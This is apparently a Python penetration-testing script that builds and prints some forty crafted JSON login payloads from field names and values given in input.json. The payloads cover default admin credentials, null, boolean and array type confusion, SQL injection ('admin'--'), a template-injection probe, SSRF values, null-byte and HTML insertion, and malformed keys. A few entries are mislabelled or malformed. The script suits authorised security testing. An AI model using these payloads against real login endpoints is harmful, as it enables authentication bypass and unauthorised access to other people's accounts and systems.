import sys
from string import Template
import json

with open('input.json', 'r') as f:
    data = json.load(f)

class Argument:
        def __init__(self):
            self.key1 = data["key1"]
            self.key2 = data["key2"]
            self.input1 = data["value_key1"]
            self.input2 = data["value_key2"]
            self.input3 = data["value_key1_2"]
            self.input4 = data["value_key2_2"]
            self.ssrf_ip   = data["ip"]
            self.ssrf_domain = data["domain"]

args = Argument()

# extra function
def insertion(args):
    return args[:len(args)//2] + "\u0000" + args[len(args)//2:]

payload = [{
        "desc":"default credential",
        "payload": f'"{args.key1}": "admin","{args.key2}": "admin"'
    },{
        "desc":"using null as value both key1 and key2",
        "payload": f'"{args.key1}": null,"{args.key2}": null'
    },{
        "desc":"using null value as key2 value",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": null'
    },{
        "desc":"using true as key2 value",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": true'
    },{
        "desc":"using array as value of key2",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": ["{args.input2}"]'
    },{
        "desc":"using nested array as value of key2",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": ["{args.input2}"]'
    },{
        "desc":"using false as value of key2",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": false'
    },{
        "desc":"using array as value of key2 with 2 value",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": ["{args.input2},{args.input4}"]'
    },{
        "desc":"using array as value of key1",
        "payload": f'"{args.key1}": ["{args.input1}"],"{args.key2}": "{args.input2}"'
    },{
        "desc":"using nested array as value of key1",
        "payload": f'"{args.key1}": [["{args.input1}"]],"{args.key2}": "{args.input2}"'
    },{
        "desc":"using array as value of key1 with 2 value",
        "payload": f'"{args.key1}": ["{args.input1}","{args.input3}"],"{args.key2}": "{args.input2}"'
    },{
        "desc":"using array as both value",
        "payload": f'"{args.key1}": ["{args.input1}"],"{args.key2}": ["{args.input2}"]'
    },{
        "desc":"using nested array as both value",
        "payload": f'"{args.key1}": [["{args.input1}"]],"{args.key2}": [["{args.input2}"]]'
    },{
        "desc":"using array as both value with 2 value",
        "payload": f'"{args.key1}": ["{args.input1}","{args.input3}"],"{args.key2}": ["{args.input2}","{args.input4}"]'
    },{
        "desc":"using admin sqli as value of key1",
        "payload": f'"{args.key1}": "admin\'--","{args.key2}": "{args.input2}"'
    },{
        "desc":"using admin sqli as value of key2",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": "admin\'--"'
    },{
        "desc":"using admin ssti as value of key1",
        "payload": f'"{args.key1}": "{{{8*8}}}","{args.key2}": "{args.input2}"'
    },{
        "desc":"using whitespace as value",
        "payload": f'"{args.key1}": " ","{args.key2}": " "'
    },{
        "desc":"using whitespace as value",
        "payload": f'"{args.key1}": "a"*1000,"{args.key2}": "b"*1000'
    },{
        "desc":"Missing first key",
        "payload": f'"{args.key2}": "{args.input2}"'
    },{
        "desc":"Missing second key",
        "payload": f'"{args.key1}": "{args.input1}"'
    },{
        "desc":"Extra key",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": "{args.input2}","extra":"extra"'
    },{
        "desc":"Missing all value and key",
        "payload": f'"": "","": ""'
    },{
        "desc":"Case Sensitivity key test",
        "payload": f'"{args.key1.upper()}": "{args.input1}","{args.key2.upper()}": "{args.input2}"'
    },{
        "desc":"using 1 as value of key2",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": 1'
    },{
        "desc":"using 1 as value of key2",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": 0'
    },{
        "desc":"using 123 as value of key2",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": 123'
    },{
        "desc":"Insertion unicode in first value",
        "payload": f'"{args.key1}": "{insertion(args.input1)}","{args.key2}":"{args.input2}"'
    },{
        "desc":"Insertion unicode in second value",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}":"{insertion(args.input2)}"'
    },{
        "desc":"Insertion html tag on first value",
        "payload": f'"{args.key1}": "<b>{args.input1}","{args.key2}": "{args.input2}"'
    },{
        "desc":"Insertion html tag on second value",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": "<b>{args.input2}"'
    },{
        "desc":"Insertion html tag on second value",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": "<b>{args.input2}"'
    },{
        "desc":"Credentials as nested objects on key1",
        "payload": f'"{args.key1}": {{"{args.key1}":"{args.input1}"}},"{args.key2}": "{args.input2}"'
    },{
        "desc":"Credentials as nested objects on key1",
        "payload": f'"{args.key1}": "{args.input1}","{args.key2}": {{"{args.key2}":"{args.input2}"}}'
    },{
        "desc":"Null char in value",
        "payload": f'"{args.key1}": "{args.input1}\\0","{args.key2}": "{args.input2}\\0"'
    },{
        "desc":"Semicolon in value",
        "payload": f'"{args.key1}": "{args.input1};","{args.key2}": "{args.input2};"'
    },{
        "desc":"Equal sign in value",
        "payload": f'"{args.key1}": "{args.input1}=","{args.key2}": "{args.input2}="'
    },{
        "desc":"Asterisk sign in value",
        "payload": f'"{args.key1}": "{args.input1}*","{args.key2}": "{args.input2}*"'
    },{
        "desc":"ip as value",
        "payload": f'"{args.key1}": "{args.ssrf_ip}","{args.key2}": "{args.ssrf_ip}"'
    },{
        "desc":"Domain as value",
        "payload": f'"{args.key1}": "{args.ssrf_domain}","{args.key2}": "{args.ssrf_domain}"'
    },{
        "desc":"Exponential as value",
        "payload": f'"{args.key1}": -1e+30","{args.key2}": -1e+30'
    },
]

for i in payload:
    print(i["payload"])